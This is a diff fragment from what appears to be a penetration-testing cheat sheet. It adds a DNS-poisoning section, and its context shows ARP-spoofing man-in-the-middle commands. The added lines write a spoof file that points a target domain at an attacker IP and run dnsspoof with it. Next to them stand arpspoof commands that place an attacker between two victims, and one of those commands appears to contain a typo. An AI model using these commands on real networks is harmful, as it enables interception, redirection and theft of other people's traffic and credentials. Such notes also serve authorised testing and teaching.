@@ -154,6 +154,10 @@
     MiTM between vtcim1 & victm2 using arp poisonning:
         arpspoof -i tap0 -t vic1_IP -r vic2_IP
         arpspoof -i tap0 -t vic2_IP -r vic2_IP
+#### 9.2 DNS Poisonning 
+    echo "AttackeIP *.DOMAIN_TO_SPOOF" > dnsspoofconf 
+    dnsspoof -i  eth1 -f dnsspoofconf
+
 
 ### 10.Web Apps
 #### 10.1 Scanning/Discovring
